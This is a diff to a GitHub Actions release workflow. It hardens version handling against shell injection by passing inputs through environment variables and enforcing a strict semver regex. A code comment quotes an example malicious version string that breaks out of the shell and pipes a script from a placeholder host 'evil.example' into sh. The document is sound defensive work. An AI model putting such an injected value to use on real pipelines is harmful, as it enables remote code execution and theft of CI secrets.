@@ -18,21 +18,6 @@ jobs:
       id-token: write
 
     steps:
-      - name: Validate workflow_dispatch version input
-        # F10c: reject inputs that don't match strict semver before they
-        # reach any `run:` step. Without this, a maliciously-crafted
-        # version string like `0.2.1" ; curl evil.example | sh ; echo "`
-        # would land directly inside the shell commands that interpolate
-        # `${{ steps.get_version.outputs.version }}` further down.
-        if: github.event_name == 'workflow_dispatch'
-        env:
-          MOVEHAT_RAW_VERSION: ${{ github.event.inputs.version }}
-        run: |
-          if ! [[ "$MOVEHAT_RAW_VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+(-(alpha|beta|rc)(\.[0-9]+)?)?$ ]]; then
-            echo "::error::Invalid version input. Expected strict semver (e.g. 0.2.1, 0.2.1-rc.1)."
-            exit 1
-          fi
-
       - name: Checkout code
         uses: actions/checkout@v4
 
@@ -55,14 +40,32 @@ jobs:
       - name: Install dependencies
         run: pnpm install
 
-      - name: Get version
+      - name: Get and validate version
         id: get_version
+        # F10c: every later step interpolates this version directly into
+        # shell (npm version, sed, VERSION=, git commit, git tag, git push).
+        # Two guards here:
+        #   1. Read both raw inputs via `env:` so a poisoned
+        #      `release.tag_name` or `workflow_dispatch.inputs.version`
+        #      can never break out of THIS step's shell — it sits in a
+        #      env var, not inline `${{ }}` interpolation.
+        #   2. Apply strict semver regex (after stripping a leading `v`
+        #      from release tags) before emitting the step output.
+        #      Anything that doesn't match fails the workflow before
+        #      any downstream consumer sees the value.
+        env:
+          MOVEHAT_RAW_RELEASE_TAG: ${{ github.event.release.tag_name }}
+          MOVEHAT_RAW_DISPATCH_VERSION: ${{ github.event.inputs.version }}
+          MOVEHAT_EVENT_NAME: ${{ github.event_name }}
         run: |
-          if [ "${{ github.event_name }}" == "release" ]; then
-            VERSION="${{ github.event.release.tag_name }}"
-            VERSION="${VERSION#v}"  # Remove 'v' prefix if present
+          if [ "$MOVEHAT_EVENT_NAME" = "release" ]; then
+            VERSION="${MOVEHAT_RAW_RELEASE_TAG#v}"  # Remove 'v' prefix if present
           else
-            VERSION="${{ github.event.inputs.version }}"
+            VERSION="$MOVEHAT_RAW_DISPATCH_VERSION"
+          fi
+          if ! [[ "$VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+(-(alpha|beta|rc)(\.[0-9]+)?)?$ ]]; then
+            echo "::error::Resolved version '$VERSION' is not strict semver (expected e.g. 0.2.1 or 0.2.1-rc.1)."
+            exit 1
           fi
           echo "version=$VERSION" >> $GITHUB_OUTPUT
           echo "Publishing version: $VERSION"
